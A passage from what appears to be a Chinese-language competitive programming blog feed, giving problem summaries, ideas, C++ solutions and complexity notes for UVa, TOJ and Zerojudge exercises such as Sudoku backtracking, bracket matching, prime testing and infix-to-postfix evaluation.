class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> x = nx[depth];</span><br><span class="line">	<span class="keyword">int</span> y = ny[depth];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n*n &amp;&amp; !found ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!col[y][i] &amp;&amp; !row[x][i] &amp;&amp; !small_sq[n*(x/n) + y/n][i])&#123;</span><br><span class="line">			col[y][i] = <span class="literal">true</span>;</span><br><span class="line">			row[x][i] = <span class="literal">true</span>;</span><br><span class="line">			small_sq[n*(x/n) + y/n][i] = <span class="literal">true</span>;</span><br><span class="line">			arr[x][y] = i;</span><br><span class="line">			DFS(depth+<span class="number">1</span>);</span><br><span class="line">			col[y][i] = <span class="literal">false</span>;</span><br><span class="line">			row[x][i] = <span class="literal">false</span>;</span><br><span class="line">			small_sq[n*(x/n) + y/n][i] = <span class="literal">false</span>;</span><br><span class="line">			arr[x][y] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(out) <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> out=<span class="literal">true</span>;</span><br><span class="line">		R = <span class="number">0</span>;</span><br><span class="line">		found = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n*n ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n*n ; j++)&#123;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">				<span class="keyword">if</span>(arr[i][j] == <span class="number">0</span>)&#123;</span><br><span class="line">					nx[R] = i;</span><br><span class="line">					ny[R] = j;</span><br><span class="line">					R++;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		init();</span><br><span class="line">		DFS(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span>(!found)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"NO SOLUTION\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>每筆測資輸入時間複雜度為 $O(n^2 \times n^2)$</p>
<p>DFS 每次最多有 $n^2$ 種選擇，最多有 $n^2 \times n^2$ 層</p>
<p>每筆測資 DFS 時間複雜度為 $O(n^{2^{n^{4}}})$</p>
<p>每筆測資總時間複雜度為 $O(n^4 + n^{2^{n^{4}}})$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 458</title>
    <url>/2021/03/23/UVa458/</url>
    <content><![CDATA[<h1 id="UVa-458"><a href="#UVa-458" class="headerlink" title="UVa 458"></a>UVa 458</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?458" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?458</a></p>
<p>有一種特定加密方式</p>
<p>若 $K = 2$ 則 apple 經過加密後會變成 crrng</p>
<p>給你一個密文字串 請從 Sample Output 及 Sample Input 反推 $K$，然後輸出其明文</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>觀察一下加密方式發現密文實際上就是名文加上長度 $7$ 的位移</p>
<p>所以要推回原文，只需要減去 $7$ 即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> s;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;s)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="keyword">char</span>(s[i] - <span class="number">7</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每筆測資總時間複雜度為 $O(len(s))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa907</title>
    <url>/2020/09/21/UVa907/</url>
    <content><![CDATA[<h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?907" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?907</a><br>在一趟路途中總共過了 $k$ 天晚上，也就是 $k+1$ 天<br>在 $n$ 個暫停點之間加上起點與終點共包含 $n+1$ 條路連接兩兩暫停點，每個路徑都有一個距離<br>求在經過 $k$ 天晚上的情況下，一天行走距離的最小值為多少</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>如果說一日行走距離 $m$ 可以在 $k+1$ 天走完，那麼距離 $m+1$ 也一定可以<br>所以觀察到行走距離具有單調性<br>枚舉一天行走的距離，如果所需的時間超過 $k$ ，就將枚舉的上界調整，否則調整下界</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,k,Min=<span class="number">0</span>,Max=<span class="number">0</span>,arr[<span class="number">605</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> p)</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">		<span class="keyword">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> dis=arr[<span class="number">0</span>],day=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(dis+arr[i]&gt;mid)&#123;</span><br><span class="line">				day++;</span><br><span class="line">				dis=arr[i];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> dis+=arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(dis&lt;=mid) day++;</span><br><span class="line">		<span class="keyword">if</span>(day&gt;p) l=mid+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> r=mid;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k)&#123;</span><br><span class="line">		Min=Max=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;=n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">			Min=max(Min,arr[i]);</span><br><span class="line">			Max+=arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;search(Min,Max,k+<span class="number">1</span>)&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>二分搜尋的上界與下界的差值約若為 $\sum arr[i]$<br>複雜度約為 $O(log_2 \sum arr[i])$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>Binary Search</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 96</title>
    <url>/2021/03/23/TOJ96/</url>
    <content><![CDATA[<h1 id="TOJ-96"><a href="#TOJ-96" class="headerlink" title="TOJ 96"></a>TOJ 96</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/96/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/96/</a></p>
<p>給一個只有兩個運算元以及一個運算子的式子，求該式子的答案</p>
<p>其中，運算元包含 $+, -, *, /$</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a&gt;&gt;c&gt;&gt;b;</span><br><span class="line">    <span class="keyword">if</span>(c==<span class="string">'+'</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">" + "</span>&lt;&lt;b&lt;&lt;<span class="string">" = "</span>&lt;&lt;a+b&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">'-'</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">" - "</span>&lt;&lt;b&lt;&lt;<span class="string">" = "</span>&lt;&lt;a-b&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">'*'</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">" * "</span>&lt;&lt;b&lt;&lt;<span class="string">" = "</span>&lt;&lt;a*b&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">'/'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(b==<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"ERROR\n"</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="string">" / "</span>&lt;&lt;b&lt;&lt;<span class="string">" = "</span>&lt;&lt;a/b&lt;&lt;<span class="string">" ... "</span>&lt;&lt;a%b&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa673</title>
    <url>/2020/09/11/UVa673/</url>
    <content><![CDATA[<h1 id="UVa673"><a href="#UVa673" class="headerlink" title="UVa673"></a>UVa673</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?673" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?673</a><br>給一個只包含 <code>(</code> <code>)</code> <code>[</code> <code>]</code> 的字串<br>定義合法的字串需要符合以下任一條件</p>
<ol>
<li>字串為空字串</li>
<li>如果 $A$ 和 $B$ 都為正確的運算式，則 $A B$ 也為正確的運算式，</li>
<li>如果 $A$ 為正確的運算式，則 $(A)$ 及 $[A]$ 都為正確的運算式。<br>求該字串是否為合法字串</li>
</ol>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>如果括號要能匹配的話，必定會兩者相鄰，例如 <code>()</code> 或是 <code>[]</code><br>那麼，我們只需要一找到匹配的括號就消除，最後如果還有剩餘就是不合法字串，否則為合法字串<br>利用<strong>stack</strong>的特性可以簡單地完成</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt;st;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		getline(<span class="built_in">cin</span>,s);</span><br><span class="line">		<span class="keyword">while</span>(!st.empty())</span><br><span class="line">			st.pop();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(s[i] == <span class="string">'('</span> || s[i] == <span class="string">'['</span>)</span><br><span class="line">				st.push(s[i]);</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">if</span>(st.empty())&#123;</span><br><span class="line">					st.push(s[i]);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(st.top()==<span class="string">'('</span> &amp;&amp; s[i]==<span class="string">')'</span>)&#123;</span><br><span class="line">					st.pop();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(st.top()==<span class="string">'['</span> &amp;&amp; s[i]==<span class="string">']'</span>)&#123;</span><br><span class="line">					st.pop();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					st.push(s[i]);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(st.empty())</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Yes\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"No\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>掃過一次字串即可，每次複雜度為 $O(len(s))$<br>總複雜度 $O(tlen(s))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>資料結構</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge a007</title>
    <url>/2020/09/11/Zerojudge%20a007/</url>
    <content><![CDATA[<h1 id="Zerojudge-a007"><a href="#Zerojudge-a007" class="headerlink" title="Zerojudge a007"></a>Zerojudge a007</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=a007" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=a007</a><br>多筆測資，給一個數，求是否為質數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於一個數 $N$ ，只需要判斷 $2$ ~ $\sqrt{N}$ 的質數，是否有能整除 $N$ 的即可<br>如果有，則非質數<br>預先將 $0$ ~ $\sqrt{2147483647}$ 的質數表建立起來，對於每次輸入再一一判斷即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">bool</span> prime[<span class="number">47000</span>];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; primes;</span><br><span class="line"><span class="keyword">int</span> n,sq=<span class="built_in">sqrt</span>(<span class="number">2147483647</span>);</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;sq ; i++)&#123;</span><br><span class="line">		prime[i]=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	prime[<span class="number">0</span>]=prime[<span class="number">1</span>]=<span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span> ; i&lt;sq ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(prime[i])&#123;</span><br><span class="line">			primes.push_back(i);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=i*i ; j&lt;sq ; j+=i)&#123;</span><br><span class="line">				prime[j]=<span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">		<span class="keyword">int</span> sq=<span class="built_in">sqrt</span>(n);</span><br><span class="line">		<span class="keyword">bool</span> is_prime=<span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> i: primes)&#123;</span><br><span class="line">			<span class="keyword">if</span>(i&gt;=sq) <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">if</span>(n%i==<span class="number">0</span>)&#123;</span><br><span class="line">				is_prime=<span class="literal">false</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(is_prime &amp;&amp; n!=<span class="number">1</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"質數\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">"非質數\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>預處理時間複雜度約略為 $O(\sqrt{N}^2)$<br>而每筆處理時間複雜度約為 $O(N)$<br>總複雜度約為 $O(N)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>數論</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge a017</title>
    <url>/2020/09/11/Zerojudge%20a017/</url>
    <content><![CDATA[<h1 id="Zerojudge-a017"><a href="#Zerojudge-a017" class="headerlink" title="Zerojudge a017"></a>Zerojudge a017</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=a017" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=a017</a><br>給定一個中序運算式，包含 <code>+</code> <code>-</code> <code>*</code> <code>/</code> <code>%</code> ，求運算結果</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於中序運算在想法上比較不容易思考，改成後序運算會更佳<br>因此我先將給定運算式轉成後序運算式，再進行運算</p>
<p>簡單介紹一下前、中、後序運算<br>例如在中序運算式是 <code>1 + ( 2 + 3 * 5 ) % 2</code></p>
<h3 id="前序"><a href="#前序" class="headerlink" title="前序"></a>前序</h3><p>前序運算會將上述的運算式改成 <code>+ 1 % + 2 * 3 5 2</code><br>從右邊看回來</p>
<ol>
<li><code>+ 1 % + 2 15 2</code></li>
<li><code>+ 1 % 17 2</code></li>
<li><code>+ 1 1</code></li>
<li><code>2</code></li>
</ol>
<h3 id="中序"><a href="#中序" class="headerlink" title="中序"></a>中序</h3><p>中序運算是由左向右看，遇到括號從內往外看，先乘除後加減<br>平常我們使用的都是中序運算</p>
<ol>
<li><code>1 + ( 2 + 15 ) % 2</code></li>
<li><code>1 + ( 17 ) % 2</code></li>
<li><code>1 + 1</code></li>
<li><code>2</code></li>
</ol>
<h3 id="後序"><a href="#後序" class="headerlink" title="後序"></a>後序</h3><p>後序運算會先將上述運算式改成 <code>1 2 3 5 * + 2 % +</code><br>從左邊看過去，遇到運算子就向前取兩個運算元進行計算</p>
<ol>
<li><code>1 2 15 + 2 % +</code></li>
<li><code>1 17 2 % +</code></li>
<li><code>1 1 +</code></li>
<li><code>2</code></li>
</ol>
<p>(也可參考此資料: <a href="https://magiclen.org/arithmetic/" target="_blank" rel="noopener">https://magiclen.org/arithmetic/</a>)</p>
<p>後序運算會先將運算元放入，再將運算子放入<br>這邊會用一個stack儲存運算元，並用vector或queue儲存結果<br>為了達到先乘除後加減，需要對運算子的優先度進行判斷<br>轉換情況如下</p>
<ol>
<li>遇到運算元，直接放入結果</li>
<li>遇到 <code>(</code>，直接放入stack</li>
<li>遇到運算子<ol>
<li>將stack頂端所有優先度&lt;=當前運算子的都放入結果</li>
<li>將當前運算子放入stack</li>
</ol>
</li>
<li>遇到<code>)</code>，將stack中所有在<code>(</code>後的元素都放入結果，並將<code>(</code>移除</li>
</ol>
<p>而這裡轉換成後序運算式後我們可以利用<strong>stack</strong>達成計算<br>從左邊開始，每次將運算內容放進stack<br>遇到運算子就從stack拿出兩個運算元計算，再重新推入stack<br>重複直到運算式結束</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="built_in">string</span>&gt; op;</span><br><span class="line"><span class="built_in">string</span> input,tr;</span><br><span class="line"><span class="built_in">queue</span>&lt;<span class="built_in">string</span>&gt; res;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prior</span><span class="params">(<span class="built_in">string</span> ch)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(ch==<span class="string">"+"</span> || ch==<span class="string">"-"</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(ch==<span class="string">"*"</span> || ch==<span class="string">"/"</span> || ch==<span class="string">"%"</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_op</span><span class="params">(<span class="built_in">string</span> ch)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(ch==<span class="string">"+"</span> || ch==<span class="string">"-"</span> || ch==<span class="string">"*"</span> || ch==<span class="string">"/"</span> || ch==<span class="string">"%"</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">to_post</span><span class="params">(<span class="built_in">string</span> s)</span></span>&#123;</span><br><span class="line">	<span class="built_in">stringstream</span> ss;</span><br><span class="line">	ss&lt;&lt;input;</span><br><span class="line">	<span class="keyword">while</span>(!res.empty()) res.pop();</span><br><span class="line">	<span class="keyword">while</span>(ss&gt;&gt;tr)&#123;</span><br><span class="line">		<span class="keyword">if</span>(is_op(tr))&#123;</span><br><span class="line">			<span class="keyword">while</span>(!op.empty() &amp;&amp; prior(tr) &lt;= prior(op.top()))&#123;</span><br><span class="line">				res.push(op.top());</span><br><span class="line">				op.pop();</span><br><span class="line">			&#125;</span><br><span class="line">			op.push(tr);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(tr == <span class="string">"("</span>)&#123;</span><br><span class="line">			op.push(tr);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(tr == <span class="string">")"</span>)&#123;</span><br><span class="line">			<span class="keyword">while</span>(op.top()!=<span class="string">"("</span>)&#123;</span><br><span class="line">				res.push(op.top());</span><br><span class="line">				op.pop();</span><br><span class="line">			&#125;</span><br><span class="line">			op.pop();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			res.push(tr);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(!op.empty())&#123;</span><br><span class="line">		res.push(op.top());</span><br><span class="line">		op.pop();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">string_to_num</span><span class="params">(<span class="built_in">string</span> s)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">		ret*=<span class="number">10</span>;</span><br><span class="line">		ret+=s[i]-<span class="string">'0'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(getline(<span class="built_in">cin</span>,input))&#123;</span><br><span class="line">		to_post(input);</span><br><span class="line">		<span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; nums;</span><br><span class="line">		<span class="keyword">while</span>(!res.empty())&#123;</span><br><span class="line">			<span class="keyword">if</span>(is_op(res.front()))&#123;</span><br><span class="line">				<span class="keyword">int</span> b = nums.top();</span><br><span class="line">				nums.pop();</span><br><span class="line">				<span class="keyword">int</span> a = nums.top();</span><br><span class="line">				nums.pop();</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">if</span>(res.front() == <span class="string">"+"</span>)&#123;</span><br><span class="line">					nums.push(a+b);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(res.front() == <span 